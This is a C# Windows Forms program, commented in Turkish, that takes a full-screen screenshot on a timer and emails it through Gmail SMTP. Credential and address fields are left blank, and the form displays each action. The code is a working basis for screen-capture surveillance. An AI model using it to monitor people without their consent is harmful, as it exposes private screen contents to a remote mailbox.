using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SendMailScreenShot
{
    public partial class Form1 : Form
    {
        // Timer Nesneleri oluşturuldu
        Timer timer1;
        Timer timer2;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Timer1 belirli aralıklarla ekran görüntüsünü alıyor
            timer1 = new Timer();
            timer1.Interval = 800000;
            timer1.Tick += (o, s) =>
              {
                  Bitmap bmp = ScreenShot();
                  bmp.Save(@"D:\Ekran\Ekran.png", ImageFormat.Png);
                  bmp.Dispose();
                  listBox1.Items.Add("Ekran Görüntüsü Alındı");
              };
            // Timer2 belirli aralıklarla ekran görüntüsünü gönderiyor
            timer2 = new Timer();
            timer2.Interval = 1000000;
            timer2.Tick += (o, s) =>
              {
                  SmtpClient client = new SmtpClient();
                  client.Port = 587;
                  client.EnableSsl = true;
                  client.Host = "smtp.gmail.com"; // Gmail kullanıldı
                  client.Credentials = new NetworkCredential("", ""); //kimden gönderilecek ? KullanıcıAdı ve Şifre
                  MailMessage mm = new MailMessage("", ""); // Kime gönderilecek ?
                  Attachment atc = new Attachment(@"D:\Ekran\Ekran.png");
                  mm.Attachments.Add(atc);
                  mm.Subject = "Ekran";
                  mm.Body = "Ekran";
                  client.Send(mm);
                  listBox1.Items.Add("Mail Gönderildi");
                  atc.Dispose();
              };

            timer1.Start();
            timer2.Start();
        }

        // Ekran görüntüsünü alıyor(tamEkran)
        private Bitmap ScreenShot()
        {
            Bitmap ScreenShot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gfx = Graphics.FromImage(ScreenShot);
            gfx.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            return ScreenShot;
        }
    }
}
